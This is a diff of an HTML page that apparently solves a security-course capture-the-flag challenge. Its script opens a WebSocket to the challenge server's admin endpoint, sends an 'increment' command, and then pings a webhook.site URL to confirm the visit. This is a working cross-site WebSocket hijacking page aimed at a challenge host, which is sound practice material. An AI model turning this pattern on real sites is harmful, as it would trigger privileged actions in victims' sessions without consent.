@@ -3,39 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Message</title>
+    <title>WebSocket and Webhook</title>
 </head>
 <body>
-    <h1>Sending Message</h1>
-    <p>Check your webhook for the message!</p>
+    <h1>WebSocket and Webhook Example</h1>
+    <p>Wait for the WebSocket connection to be established, and then a message will be sent to the Webhook!</p>
 
     <script>
+        // WebSocket URL
+        const websocketURL = "ws://ce441-web.spchallenge.ir:8080/admin/ws";
+
         // Webhook URL
         const webhookURL = "https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a";
 
-        // Message payload
-        const payload = {
-            message: "Hello, this is a test message from HTML + JS!"
+        // Create a new WebSocket connection
+        const socket = new WebSocket(websocketURL);
+
+        // Event handler for when the WebSocket connection is open
+        socket.onopen = function() {
+            console.log("WebSocket connected");
+
+            // Send a message to the WebSocket server
+            socket.send("increment");
+            console.log("Sent 'increment' command to the WebSocket server");
+
+            // Send a POST request to the Webhook after WebSocket connection
+            sendPostToWebhook();
         };
 
-        // Send the POST request
-        fetch(webhookURL, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log("Message sent successfully!");
-            } else {
-                console.error("Failed to send message:", response.statusText);
-            }
-        })
-        .catch(error => {
-            console.error("Error:", error);
-        });
+        // Event handler for WebSocket errors
+        socket.onerror = function(error) {
+            console.error("WebSocket Error:", error);
+        };
+
+        // Event handler for WebSocket closure
+        socket.onclose = function() {
+            console.log("WebSocket closed");
+        };
+
+        // Function to send a POST request to the webhook
+        function sendPostToWebhook() {
+            console.log("Sending POST request to Webhook");
+
+            // Prepare the message to send to the webhook
+            const payload = {
+                message: "Hello, the WebSocket connection has been established and the 'increment' command was sent!"
+            };
+
+            // Send POST request to Webhook
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("POST request sent successfully!");
+                } else {
+                    console.error("Failed to send POST request:", response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error("Error sending POST request:", error);
+            });
+        }
     </script>
 </body>
 </html>
